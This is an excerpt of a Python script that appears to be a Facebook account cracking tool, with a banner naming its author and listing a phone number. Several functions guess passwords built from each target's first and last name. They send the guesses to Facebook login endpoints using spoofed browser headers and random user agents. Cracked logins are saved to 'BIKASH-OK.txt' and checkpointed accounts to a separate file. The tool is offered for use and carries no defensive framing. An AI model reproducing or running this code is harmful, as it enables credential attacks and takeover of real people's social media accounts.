...
########  ##     ## ##     ## 
    ...
    ┌───────────────────────────────────────┐
       [✓] AUTHOR   : BIKASH X HERO          
       [✓] GITHUB   : BIKASH-DON                
       [✓] WHATSAPP : +9779742524177      
       [✓] VERSION  : 0.1                       
       [✓] POWER BY : \033[1;32mBIKASH RANA MAGAR \033[1;37m
       [✓] TOOL OWNER : BIKASH MAGAR            
    └───────────────────────────────────────┘""")                                           
...
def BIKASH():
	...
	if me in ["1", "01","11","A","a"]:
		...
		try:
			...
			exit()
		print(f' [1] Method 1 (New ids Metho)\n [2] Method 2 (Best Method)\n [3] Method 3 (Old ids Method)\n ')
		mthd=input(f' Choose: ')
		plist=[]
		try:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [BIKASH😍-OK] %s | %s'%(ids,pas))
                                open(f'/sdcard/BIKASH-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [BIKASH😞-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/BIKASH-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def ffb1(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'www.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://www.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://www.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [BIKASH😍-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/BIKASH-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def ffb7(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [BIKASH-VIP] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
